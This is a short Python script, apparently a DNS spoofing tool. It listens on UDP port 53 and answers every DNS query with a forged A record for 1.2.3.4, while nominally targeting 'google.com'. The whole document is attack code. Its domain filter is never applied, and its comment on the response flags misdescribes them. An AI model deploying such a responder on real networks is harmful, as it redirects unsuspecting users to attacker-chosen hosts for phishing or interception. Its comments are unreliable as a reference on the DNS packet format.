import socket
import struct

# Define the domain to spoof and the IP address to map it to
DOMAIN_TO_SPOOF = b"google.com"
SPOOFED_IP = b"\x01\x02\x03\x04"  # 1.2.3.4 in bytes format

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Bind the socket to a local interface and port
sock.bind(("0.0.0.0", 53))

# Define a function to send the spoofed DNS response
def send_dns_response(data, addr):
    # Extract DNS query ID
    query_id = data[:2]

    # Build DNS response packet
    response = (
        query_id +  # Transaction ID
        b"\x81\x80" +  # Flags: Response (QR), Opcode (4-bit), Authoritative Answer (AA)
        b"\x00\x01" +  # Questions (1)
        b"\x00\x01" +  # Answer RRs (1)
        b"\x00\x00" +  # Authority RRs (0)
        b"\x00\x00" +  # Additional RRs (0)
        data[12:] +  # Original domain name and query type
        b"\xc0\x0c" +  # Pointer to domain name
        b"\x00\x01" +  # Type A record
        b"\x00\x01" +  # Class IN
        b"\x00\x00\x00\x0a" +  # TTL (10 seconds)
        b"\x00\x04" +  # Data length
        SPOOFED_IP  # Spoofed IP address
    )

    # Send DNS response
    sock.sendto(response, addr)

# Listen for DNS requests and spoof responses
while True:
    data, addr = sock.recvfrom(1024)
    if data:
        send_dns_response(data, addr)
